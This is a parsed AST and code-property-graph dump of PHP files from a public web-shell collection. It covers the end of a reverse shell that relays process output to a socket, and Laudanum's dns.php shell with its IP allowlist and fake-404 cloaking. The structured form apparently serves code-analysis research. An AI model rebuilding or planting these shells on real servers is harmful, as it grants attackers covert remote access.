id:int	labels:label	type	flags:string_array	lineno:int	code	childnum:int	funcid:int	classname	namespace	endlineno:int	name	doccomment
4198	AST	string		152	"SOCK: "	0	3819		""			
4199	AST	AST_VAR		152		1	3819		""			
4200	AST	string		152	"input"	0	3819		""			
4201	AST	AST_CALL		153		3	3819		""			
4202	AST	AST_NAME	NAME_NOT_FQ	153		0	3819		""			
4203	AST	string		153	"fwrite"	0	3819		""			
4204	AST	AST_ARG_LIST		153		1	3819		""			
4205	AST	AST_DIM		153		0	3819		""			
4206	AST	AST_VAR		153		0	3819		""			
4207	AST	string		153	"pipes"	0	3819		""			
4208	AST	integer		153	0	1	3819		""			
4209	AST	AST_VAR		153		1	3819		""			
4210	AST	string		153	"input"	0	3819		""			
4211	AST	AST_IF		158		5	3819		""			
4212	AST	AST_IF_ELEM		158		0	3819		""			
4213	AST	AST_CALL		158		0	3819		""			
4214	AST	AST_NAME	NAME_NOT_FQ	158		0	3819		""			
4215	AST	string		158	"in_array"	0	3819		""			
4216	AST	AST_ARG_LIST		158		1	3819		""			
4217	AST	AST_DIM		158		0	3819		""			
4218	AST	AST_VAR		158		0	3819		""			
4219	AST	string		158	"pipes"	0	3819		""			
4220	AST	integer		158	1	1	3819		""			
4221	AST	AST_VAR		158		1	3819		""			
4222	AST	string		158	"read_a"	0	3819		""			
4223	AST	AST_STMT_LIST		158		1	3819		""			
4224	AST	AST_IF		159		0	3819		""			
4225	AST	AST_IF_ELEM		159		0	3819		""			
4226	AST	AST_VAR		159		0	3819		""			
4227	AST	string		159	"debug"	0	3819		""			
4228	AST	AST_CALL		159		1	3819		""			
4229	AST	AST_NAME	NAME_NOT_FQ	159		0	3819		""			
4230	AST	string		159	"printit"	0	3819		""			
4231	AST	AST_ARG_LIST		159		1	3819		""			
4232	AST	string		159	"STDOUT READ"	0	3819		""			
4233	AST	AST_ASSIGN		160		1	3819		""			
4234	AST	AST_VAR		160		0	3819		""			
4235	AST	string		160	"input"	0	3819		""			
4236	AST	AST_CALL		160		1	3819		""			
4237	AST	AST_NAME	NAME_NOT_FQ	160		0	3819		""			
4238	AST	string		160	"fread"	0	3819		""			
4239	AST	AST_ARG_LIST		160		1	3819		""			
4240	AST	AST_DIM		160		0	3819		""			
4241	AST	AST_VAR		160		0	3819		""			
4242	AST	string		160	"pipes"	0	3819		""			
4243	AST	integer		160	1	1	3819		""			
4244	AST	AST_VAR		160		1	3819		""			
4245	AST	string		160	"chunk_size"	0	3819		""			
4246	AST	AST_IF		161		2	3819		""			
4247	AST	AST_IF_ELEM		161		0	3819		""			
4248	AST	AST_VAR		161		0	3819		""			
4249	AST	string		161	"debug"	0	3819		""			
4250	AST	AST_CALL		161		1	3819		""			
4251	AST	AST_NAME	NAME_NOT_FQ	161		0	3819		""			
4252	AST	string		161	"printit"	0	3819		""			
4253	AST	AST_ARG_LIST		161		1	3819		""			
4254	AST	AST_ENCAPS_LIST		161		0	3819		""			
4255	AST	string		161	"STDOUT: "	0	3819		""			
4256	AST	AST_VAR		161		1	3819		""			
4257	AST	string		161	"input"	0	3819		""			
4258	AST	AST_CALL		162		3	3819		""			
4259	AST	AST_NAME	NAME_NOT_FQ	162		0	3819		""			
4260	AST	string		162	"fwrite"	0	3819		""			
4261	AST	AST_ARG_LIST		162		1	3819		""			
4262	AST	AST_VAR		162		0	3819		""			
4263	AST	string		162	"sock"	0	3819		""			
4264	AST	AST_VAR		162		1	3819		""			
4265	AST	string		162	"input"	0	3819		""			
4266	AST	AST_IF		167		6	3819		""			
4267	AST	AST_IF_ELEM		167		0	3819		""			
4268	AST	AST_CALL		167		0	3819		""			
4269	AST	AST_NAME	NAME_NOT_FQ	167		0	3819		""			
4270	AST	string		167	"in_array"	0	3819		""			
4271	AST	AST_ARG_LIST		167		1	3819		""			
4272	AST	AST_DIM		167		0	3819		""			
4273	AST	AST_VAR		167		0	3819		""			
4274	AST	string		167	"pipes"	0	3819		""			
4275	AST	integer		167	2	1	3819		""			
4276	AST	AST_VAR		167		1	3819		""			
4277	AST	string		167	"read_a"	0	3819		""			
4278	AST	AST_STMT_LIST		167		1	3819		""			
4279	AST	AST_IF		168		0	3819		""			
4280	AST	AST_IF_ELEM		168		0	3819		""			
4281	AST	AST_VAR		168		0	3819		""			
4282	AST	string		168	"debug"	0	3819		""			
4283	AST	AST_CALL		168		1	3819		""			
4284	AST	AST_NAME	NAME_NOT_FQ	168		0	3819		""			
4285	AST	string		168	"printit"	0	3819		""			
4286	AST	AST_ARG_LIST		168		1	3819		""			
4287	AST	string		168	"STDERR READ"	0	3819		""			
4288	AST	AST_ASSIGN		169		1	3819		""			
4289	AST	AST_VAR		169		0	3819		""			
4290	AST	string		169	"input"	0	3819		""			
4291	AST	AST_CALL		169		1	3819		""			
4292	AST	AST_NAME	NAME_NOT_FQ	169		0	3819		""			
4293	AST	string		169	"fread"	0	3819		""			
4294	AST	AST_ARG_LIST		169		1	3819		""			
4295	AST	AST_DIM		169		0	3819		""			
4296	AST	AST_VAR		169		0	3819		""			
4297	AST	string		169	"pipes"	0	3819		""			
4298	AST	integer		169	2	1	3819		""			
4299	AST	AST_VAR		169		1	3819		""			
4300	AST	string		169	"chunk_size"	0	3819		""			
4301	AST	AST_IF		170		2	3819		""			
4302	AST	AST_IF_ELEM		170		0	3819		""			
4303	AST	AST_VAR		170		0	3819		""			
4304	AST	string		170	"debug"	0	3819		""			
4305	AST	AST_CALL		170		1	3819		""			
4306	AST	AST_NAME	NAME_NOT_FQ	170		0	3819		""			
4307	AST	string		170	"printit"	0	3819		""			
4308	AST	AST_ARG_LIST		170		1	3819		""			
4309	AST	AST_ENCAPS_LIST		170		0	3819		""			
4310	AST	string		170	"STDERR: "	0	3819		""			
4311	AST	AST_VAR		170		1	3819		""			
4312	AST	string		170	"input"	0	3819		""			
4313	AST	AST_CALL		171		3	3819		""			
4314	AST	AST_NAME	NAME_NOT_FQ	171		0	3819		""			
4315	AST	string		171	"fwrite"	0	3819		""			
4316	AST	AST_ARG_LIST		171		1	3819		""			
4317	AST	AST_VAR		171		0	3819		""			
4318	AST	string		171	"sock"	0	3819		""			
4319	AST	AST_VAR		171		1	3819		""			
4320	AST	string		171	"input"	0	3819		""			
4321	AST	AST_CALL		175		24	3819		""			
4322	AST	AST_NAME	NAME_NOT_FQ	175		0	3819		""			
4323	AST	string		175	"fclose"	0	3819		""			
4324	AST	AST_ARG_LIST		175		1	3819		""			
4325	AST	AST_VAR		175		0	3819		""			
4326	AST	string		175	"sock"	0	3819		""			
4327	AST	AST_CALL		176		25	3819		""			
4328	AST	AST_NAME	NAME_NOT_FQ	176		0	3819		""			
4329	AST	string		176	"fclose"	0	3819		""			
4330	AST	AST_ARG_LIST		176		1	3819		""			
4331	AST	AST_DIM		176		0	3819		""			
4332	AST	AST_VAR		176		0	3819		""			
4333	AST	string		176	"pipes"	0	3819		""			
4334	AST	integer		176	0	1	3819		""			
4335	AST	AST_CALL		177		26	3819		""			
4336	AST	AST_NAME	NAME_NOT_FQ	177		0	3819		""			
4337	AST	string		177	"fclose"	0	3819		""			
4338	AST	AST_ARG_LIST		177		1	3819		""			
4339	AST	AST_DIM		177		0	3819		""			
4340	AST	AST_VAR		177		0	3819		""			
4341	AST	string		177	"pipes"	0	3819		""			
4342	AST	integer		177	1	1	3819		""			
4343	AST	AST_CALL		178		27	3819		""			
4344	AST	AST_NAME	NAME_NOT_FQ	178		0	3819		""			
4345	AST	string		178	"fclose"	0	3819		""			
4346	AST	AST_ARG_LIST		178		1	3819		""			
4347	AST	AST_DIM		178		0	3819		""			
4348	AST	AST_VAR		178		0	3819		""			
4349	AST	string		178	"pipes"	0	3819		""			
4350	AST	integer		178	2	1	3819		""			
4351	AST	AST_CALL		179		28	3819		""			
4352	AST	AST_NAME	NAME_NOT_FQ	179		0	3819		""			
4353	AST	string		179	"proc_close"	0	3819		""			
4354	AST	AST_ARG_LIST		179		1	3819		""			
4355	AST	AST_VAR		179		0	3819		""			
4356	AST	string		179	"process"	0	3819		""			
4357	AST	AST_FUNC_DECL		183		29	3819		""	187	printit	
4358	Artificial	CFG_FUNC_ENTRY					4357		""		"printit"	
4359	Artificial	CFG_FUNC_EXIT					4357		""		"printit"	
4360	AST	AST_PARAM_LIST		183		0	4357		""			
4361	AST	AST_PARAM		183		0	4357		""			
4362	AST	NULL		183		0	4357		""			
4363	AST	string		183	"string"	1	4357		""			
4364	AST	NULL		183		2	4357		""			
4365	AST	NULL		183		1	4357		""			
4366	AST	AST_STMT_LIST		183		2	4357		""			
4367	AST	AST_IF		184		0	4357		""			
4368	AST	AST_IF_ELEM		184		0	4357		""			
4369	AST	AST_UNARY_OP	UNARY_BOOL_NOT	184		0	4357		""			
4370	AST	AST_VAR		184		0	4357		""			
4371	AST	string		184	"daemon"	0	4357		""			
4372	AST	AST_STMT_LIST		184		1	4357		""			
4373	AST	AST_PRINT		185		0	4357		""			
4374	AST	AST_ENCAPS_LIST		185		0	4357		""			
4375	AST	AST_VAR		185		0	4357		""			
4376	AST	string		185	"string"	0	4357		""			
4377	AST	string		185	"\n"	1	4357		""			
4378	AST	NULL		183		3	4357		""			
4379	AST	NULL		1		30	3819		""			
4380	AST	AST_ECHO		189		31	3819		""			
4381	AST	string		189	" \n\n\n\n"	0	3819		""			
4382	Filesystem	File									"dns.php"	
4383	AST	AST_TOPLEVEL	TOPLEVEL_FILE	1					""	161	"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/dns.php"	
4384	Artificial	CFG_FUNC_ENTRY					4383				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/dns.php"	
4385	Artificial	CFG_FUNC_EXIT					4383				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/dns.php"	
4386	AST	AST_STMT_LIST		1		0	4383		""			
4387	AST	AST_ASSIGN		43		0	4383		""			
4388	AST	AST_VAR		43		0	4383		""			
4389	AST	string		43	"allowedIPs"	0	4383		""			
4390	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	43		1	4383		""			
4391	AST	AST_ARRAY_ELEM		43		0	4383		""			
4392	AST	string		43	"19.168.2.16"	0	4383		""			
4393	AST	NULL		43		1	4383		""			
4394	AST	AST_ARRAY_ELEM		43		1	4383		""			
4395	AST	string		43	"192.168.1.100"	0	4383		""			
4396	AST	NULL		43		1	4383		""			
4397	AST	AST_ASSIGN		47		1	4383		""			
4398	AST	AST_VAR		47		0	4383		""			
4399	AST	string		47	"allowed"	0	4383		""			
4400	AST	integer		47	0	1	4383		""			
4401	AST	AST_FOREACH		48		2	4383		""			
4402	AST	AST_VAR		48		0	4383		""			
4403	AST	string		48	"allowedIPs"	0	4383		""			
4404	AST	AST_VAR		48		1	4383		""			
4405	AST	string		48	"IP"	0	4383		""			
4406	AST	NULL		48		2	4383		""			
4407	AST	AST_STMT_LIST		48		3	4383		""			
4408	AST	AST_IF		49		0	4383		""			
4409	AST	AST_IF_ELEM		49		0	4383		""			
4410	AST	AST_BINARY_OP	BINARY_IS_EQUAL	49		0	4383		""			
4411	AST	AST_DIM		49		0	4383		""			
4412	AST	AST_VAR		49		0	4383		""			
4413	AST	string		49	"_SERVER"	0	4383		""			
4414	AST	string		49	"REMOTE_ADDR"	1	4383		""			
4415	AST	AST_VAR		49		1	4383		""			
4416	AST	string		49	"IP"	0	4383		""			
4417	AST	AST_ASSIGN		50		1	4383		""			
4418	AST	AST_VAR		50		0	4383		""			
4419	AST	string		50	"allowed"	0	4383		""			
4420	AST	integer		50	1	1	4383		""			
4421	AST	AST_IF		53		3	4383		""			
4422	AST	AST_IF_ELEM		53		0	4383		""			
4423	AST	AST_BINARY_OP	BINARY_IS_EQUAL	53		0	4383		""			
4424	AST	AST_VAR		53		0	4383		""			
4425	AST	string		53	"allowed"	0	4383		""			
4426	AST	integer		53	0	1	4383		""			
4427	AST	AST_STMT_LIST		53		1	4383		""			
4428	AST	AST_CALL		54		0	4383		""			
4429	AST	AST_NAME	NAME_NOT_FQ	54		0	4383		""			
4430	AST	string		54	"header"	0	4383		""			
4431	AST	AST_ARG_LIST		54		1	4383		""			
4432	AST	string		54	"HTTP/1.0 404 Not Found"	0	4383		""			
4433	AST	AST_EXIT		55		1	4383		""			
4434	AST	NULL		55		0	4383		""			
4435	AST	AST_FUNC_DECL		62		4	4383		""	90	error_handler	
4436	Artificial	CFG_FUNC_ENTRY					4435		""		"error_handler"	
4437	Artificial	CFG_FUNC_EXIT					4435		""		"error_handler"	
4438	AST	AST_PARAM_LIST		62		0	4435		""			
4439	AST	AST_PARAM		62		0	4435		""			
4440	AST	NULL		62		0	4435		""			
4441	AST	string		62	"errno"	1	4435		""			
4442	AST	NULL		62		2	4435		""			
4443	AST	AST_PARAM		62		1	4435		""			
4444	AST	NULL		62		0	4435		""			
4445	AST	string		62	"errstr"	1	4435		""			
4446	AST	NULL		62		2	4435		""			
4447	AST	AST_PARAM		62		2	4435		""			
4448	AST	NULL		62		0	4435		""			
4449	AST	string		62	"errfile"	1	4435		""			
4450	AST	NULL		62		2	4435		""			
4451	AST	AST_PARAM		62		3	4435		""			
4452	AST	NULL		62		0	4435		""			
4453	AST	string		62	"errline"	1	4435		""			
4454	AST	NULL		62		2	4435		""			
4455	AST	AST_PARAM		62		4	4435		""			
4456	AST	NULL		62		0	4435		""			
4457	AST	string		62	"errcontext"	1	4435		""			
4458	AST	NULL		62		2	4435		""			
4459	AST	NULL		62		1	4435		""			
4460	AST	AST_STMT_LIST		62		2	4435		""			
4461	AST	AST_IF		66		0	4435		""			
4462	AST	AST_IF_ELEM		66		0	4435		""			
4463	AST	AST_BINARY_OP	BINARY_IS_EQUAL	66		0	4435		""			
4464	AST	AST_CALL		66		0	4435		""			
4465	AST	AST_NAME	NAME_NOT_FQ	66		0	4435		""			
4466	AST	string		66	"error_reporting"	0	4435		""			
4467	AST	AST_ARG_LIST		66		1	4435		""			
4468	AST	integer		66	0	1	4435		""			
4469	AST	AST_STMT_LIST		66		1	4435		""			
4470	AST	AST_ASSIGN_OP	BINARY_CONCAT	67		0	4435		""			
4471	AST	AST_DIM		67		0	4435		""			
4472	AST	AST_VAR		67		0	4435		""			
4473	AST	string		67	"_SESSION"	0	4435		""			
4474	AST	string		67	"output"	1	4435		""			
4475	AST	AST_BINARY_OP	BINARY_CONCAT	67		1	4435		""			
4476	AST	AST_VAR		67		0	4435		""			
4477	AST	string		67	"errstr"	0	4435		""			
4478	AST	string		67	"\n"	1	4435		""			
4479	AST	AST_IF_ELEM		68		1	4435		""			
4480	AST	NULL		68		0	4435		""			
4481	AST	AST_STMT_LIST		68		1	4435		""			
4482	AST	AST_EXIT		69		0	4435		""			
4483	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	4435		""			
4484	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	4435		""			
4485	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	4435		""			
4486	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	4435		""			
4487	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	4435		""			
4488	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	4435		""			
4489	AST	string		69	"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n   \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n  <title>Laudanum PHP DNS Access</title>\n</head>\n<body>\n  <h1>Fatal Error!</h1>\n  <p><b>"	0	4435		""			
4490	AST	AST_VAR		77		1	4435		""			
4491	AST	string		77	"errstr"	0	4435		""			
4492	AST	string		69	"</b></p>\n  <p>in <b>"	1	4435		""			
4493	AST	AST_VAR		78		1	4435		""			
4494	AST	string		78	"errfile"	0	4435		""			
4495	AST	string		69	"</b>, line <b>"	1	4435		""			
4496	AST	AST_VAR		78		1	4435		""			
4497	AST	string		78	"errline"	0	4435		""			
4498	AST	string		69	"</b>.</p>\n\n  <hr>\n  <address>\n  Copyright &copy; 2012, <a href=\"mailto:[email]\">Kevin Johnson</a> and the Laudanum team.<br/>\n  Written by Tim Medin.<br/>\n  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n  </address>\n\n</body>\n</html>"	1	4435		""			
4499	AST	NULL		62		3	4435		""			
4500	AST	AST_CALL		92		5	4383		""			
4501	AST	AST_NAME	NAME_NOT_FQ	92		0	4383		""			
4502	AST	string		92	"set_error_handler"	0	4383		""			
4503	AST	AST_ARG_LIST		92		1	4383		""			
4504	AST	string		92	"error_handler"	0	4383		""			
4505	AST	AST_ASSIGN		96		6	4383		""			
4506	AST	AST_VAR		96		0	4383		""			
4507	AST	string		96	"query"	0	4383		""			
4508	AST	AST_CONDITIONAL		96		1	4383		""			
4509	AST	AST_ISSET		96		0	4383		""			
4510	AST	AST_DIM		96		0	4383		""			
4511	AST	AST_VAR		96		0	4383		""			
4512	AST	string		96	"_POST"	0	4383		""			
4513	AST	string		96	"query"	1	4383		""			
4514	AST	AST_DIM		96		1	4383		""			
4515	AST	AST_VAR		96		0	4383		""			
4516	AST	string		96	"_POST"	0	4383		""			
4517	AST	string		96	"query"	1	4383		""			
4518	AST	string		96	""	2	4383		""			
4519	AST	AST_ASSIGN		97		7	4383		""			
4520	AST	AST_VAR		97		0	4383		""			
4521	AST	string		97	"type"	0	4383		""			
4522	AST	AST_CONDITIONAL		97		1	4383		""			
4523	AST	AST_ISSET		97		0	4383		""			
4524	AST	AST_DIM		97		0	4383		""			
4525	AST	AST_VAR		97		0	4383		""			
4526	AST	string		97	"_POST"	0	4383		""			
4527	AST	string		97	"type"	1	4383		""			
4528	AST	AST_DIM		97		1	4383		""			
4529	AST	AST_VAR		97		0	4383		""			
4530	AST	string		97	"_POST"	0	4383		""			
4531	AST	string		97	"type"	1	4383		""			
4532	AST	string		97	"DNS_ANY"	2	4383		""			
4533	AST	NULL		1		8	4383		""			
4534	AST	AST_ECHO		99		9	4383		""			
4535	AST	string		99	"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n   \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n  <title>Laudanum PHP DNS Access</title>\n  <link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n\n  <script type=\"text/javascript\">\n    function init() {\n      document.dns.query.focus();\n    }\n  </script>\n</head>\n<body onload=\"init()\">\n\n<h1>DNS Query 0.1</h1>\n<form name=\"dns\" action=\""	0	4383		""			
4536	AST	AST_ECHO		115		10	4383		""			
4537	AST	AST_DIM		115		0	4383		""			
4538	AST	AST_VAR		115		0	4383		""			
4539	AST	string		115	"_SERVER"	0	4383		""			
4540	AST	string		115	"PHP_SELF"	1	4383		""			
4541	AST	AST_ECHO		115		11	4383		""			
4542	AST	string		115	"\" method=\"POST\">\n<fieldset>\n  <legend>DNS Lookup:</legend>\n  <p>Query:<input name=\"query\" type=\"text\">\n  Type:<select name=\"type\">\n"	0	4383		""			
4543	AST	AST_ASSIGN		121		12	4383		""			
4544	AST	AST_VAR		121		0	4383		""			
4545	AST	string		121	"types"	0	4383		""			
4546	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	121		1	4383		""			
4547	AST	AST_ARRAY_ELEM		121		0	4383		""			
4548	AST	AST_CONST		121		0	4383		""			
4549	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4550	AST	string		121	"DNS_A"	0	4383		""			
4551	AST	string		121	"A"	1	4383		""			
4552	AST	AST_ARRAY_ELEM		121		1	4383		""			
4553	AST	AST_CONST		121		0	4383		""			
4554	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4555	AST	string		121	"DNS_CNAME"	0	4383		""			
4556	AST	string		121	"CNAME"	1	4383		""			
4557	AST	AST_ARRAY_ELEM		121		2	4383		""			
4558	AST	AST_CONST		121		0	4383		""			
4559	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4560	AST	string		121	"DNS_HINFO"	0	4383		""			
4561	AST	string		121	"HINFO"	1	4383		""			
4562	AST	AST_ARRAY_ELEM		121		3	4383		""			
4563	AST	AST_CONST		121		0	4383		""			
4564	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4565	AST	string		121	"DNS_MX"	0	4383		""			
4566	AST	string		121	"MX"	1	4383		""			
4567	AST	AST_ARRAY_ELEM		121		4	4383		""			
4568	AST	AST_CONST		121		0	4383		""			
4569	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4570	AST	string		121	"DNS_NS"	0	4383		""			
4571	AST	string		121	"NS"	1	4383		""			
4572	AST	AST_ARRAY_ELEM		121		5	4383		""			
4573	AST	AST_CONST		121		0	4383		""			
4574	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4575	AST	string		121	"DNS_PTR"	0	4383		""			
4576	AST	string		121	"PTR"	1	4383		""			
4577	AST	AST_ARRAY_ELEM		121		6	4383		""			
4578	AST	AST_CONST		121		0	4383		""			
4579	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4580	AST	string		121	"DNS_SOA"	0	4383		""			
4581	AST	string		121	"SOA"	1	4383		""			
4582	AST	AST_ARRAY_ELEM		121		7	4383		""			
4583	AST	AST_CONST		121		0	4383		""			
4584	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4585	AST	string		121	"DNS_TXT"	0	4383		""			
4586	AST	string		121	"TXT"	1	4383		""			
4587	AST	AST_ARRAY_ELEM		121		8	4383		""			
4588	AST	AST_CONST		121		0	4383		""			
4589	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4590	AST	string		121	"DNS_AAAA"	0	4383		""			
4591	AST	string		121	"AAAA"	1	4383		""			
4592	AST	AST_ARRAY_ELEM		121		9	4383		""			
4593	AST	AST_CONST		121		0	4383		""			
4594	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4595	AST	string		121	"DNS_SRV"	0	4383		""			
4596	AST	string		121	"SRV"	1	4383		""			
4597	AST	AST_ARRAY_ELEM		121		10	4383		""			
4598	AST	AST_CONST		121		0	4383		""			
4599	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4600	AST	string		121	"DNS_NAPTR"	0	4383		""			
4601	AST	string		121	"NAPTR"	1	4383		""			
4602	AST	AST_ARRAY_ELEM		121		11	4383		""			
4603	AST	AST_CONST		121		0	4383		""			
4604	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4605	AST	string		121	"DNS_A6"	0	4383		""			
4606	AST	string		121	"A6"	1	4383		""			
4607	AST	AST_ARRAY_ELEM		121		12	4383		""			
4608	AST	AST_CONST		121		0	4383		""			
4609	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4610	AST	string		121	"DNS_ALL"	0	4383		""			
4611	AST	string		121	"ALL"	1	4383		""			
4612	AST	AST_ARRAY_ELEM		121		13	4383		""			
4613	AST	AST_CONST		121		0	4383		""			
4614	AST	AST_NAME	NAME_NOT_FQ	121		0	4383		""			
4615	AST	string		121	"DNS_ANY"	0	4383		""			
4616	AST	string		121	"ANY"	1	4383		""			
4617	AST	AST_IF		123		13	4383		""			
4618	AST	AST_IF_ELEM		123		0	4383		""			
4619	AST	AST_UNARY_OP	UNARY_BOOL_NOT	123		0	4383		""			
4620	AST	AST_CALL		123		0	4383		""			
4621	AST	AST_NAME	NAME_NOT_FQ	123		0	4383		""			
4622	AST	string		123	"in_array"	0	4383		""			
4623	AST	AST_ARG_LIST		123		1	4383		""			
4624	AST	AST_VAR		123		0	4383		""			
4625	AST	string		123	"type"	0	4383		""			
4626	AST	AST_CALL		123		1	4383		""			
4627	AST	AST_NAME	NAME_NOT_FQ	123		0	4383		""			
4628	AST	string		123	"array_keys"	0	4383		""			
4629	AST	AST_ARG_LIST		123		1	4383		""			
4630	AST	AST_VAR		123		0	4383		""			
4631	AST	string		123	"types"	0	4383		""			
4632	AST	AST_STMT_LIST		123		1	4383		""			
4633	AST	AST_ASSIGN		124		0	4383		""			
4634	AST	AST_VAR		124		0	4383		""			
4635	AST	string		124	"type"	0	4383		""			
4636	AST	string		124	"ANY"	1	4383		""			
4637	AST	AST_ASSIGN		127		14	4383		""			
4638	AST	AST_VAR		127		0	4383		""			
4639	AST	string		127	"validtype"	0	4383		""			
4640	AST	integer		127	0	1	4383		""			
4641	AST	AST_FOREACH		128		15	4383		""			
4642	AST	AST_CALL		128		0	4383		""			
4643	AST	AST_NAME	NAME_NOT_FQ	128		0	4383		""			
4644	AST	string		128	"array_keys"	0	4383		""			
4645	AST	AST_ARG_LIST		128		1	4383		""			
4646	AST	AST_VAR		128		0	4383		""			
4647	AST	string		128	"types"	0	4383		""			
4648	AST	AST_VAR		128		1	4383		""			
4649	AST	string		128	"t"	0	4383		""			
4650	AST	NULL		128		2	4383		""			
4651	AST	AST_STMT_LIST		128		3	4383		""			
4652	AST	AST_ECHO		129		0	4383		""			
4653	AST	AST_BINARY_OP	BINARY_CONCAT	129		0	4383		""			
4654	AST	AST_BINARY_OP	BINARY_CONCAT	129		0	4383		""			
4655	AST	AST_ENCAPS_LIST		129		0	4383		""			
4656	AST	string		129	"    <option value=\""	0	4383		""			
4657	AST	AST_VAR		129		1	4383		""			
4658	AST	string		129	"t"	0	4383		""			
4659	AST	string		129	"\""	2	4383		""			
4660	AST	AST_CONDITIONAL		129		1	4383		""			
4661	AST	AST_BINARY_OP	BINARY_IS_EQUAL	129		0	4383		""			
4662	AST	AST_VAR		129		0	4383		""			
4663	AST	string		129	"type"	0	4383		""			
4664	AST	AST_VAR		129		1	4383		""			
4665	AST	string		129	"t"	0	4383		""			
4666	AST	string		129	" SELECTED"	1	4383		""			
4667	AST	string		129	""	2	4383		""			
4668	AST	AST_ENCAPS_LIST		129		1	4383		""			
4669	AST	string		129	">"	0	4383		""			
4670	AST	AST_VAR		129		1	4383		""			
4671	AST	string		129	"t"	0	4383		""			
4672	AST	string		129	"</option>\n"	2	4383		""			
4673	AST	NULL		1		16	4383		""			
4674	AST	AST_ECHO		132		17	4383		""			
4675	AST	string		132	"\n  </select>\n  <input type=\"submit\" value=\"Submit\">\n</fieldset>\n</form>\n\n\n"	0	4383		""			
4676	AST	AST_IF		140		18	4383		""			
4677	AST	AST_IF_ELEM		140		0	4383		""			
4678	AST	AST_BINARY_OP	BINARY_IS_NOT_EQUAL	140		0	4383		""			
4679	AST	AST_VAR		140		0	4383		""			
4680	AST	string		140	"query"	0	4383		""			
4681	AST	string		140	""	1	4383		""			
4682	AST	AST_STMT_LIST		141		1	4383		""			
4683	AST	AST_ASSIGN		142		0	4383		""			
4684	AST	AST_VAR		142		0	4383		""			
4685	AST	string		142	"result"	0	4383		""			
4686	AST	AST_CALL		142		1	4383		""			
4687	AST	AST_NAME	NAME_NOT_FQ	142		0	4383		""			
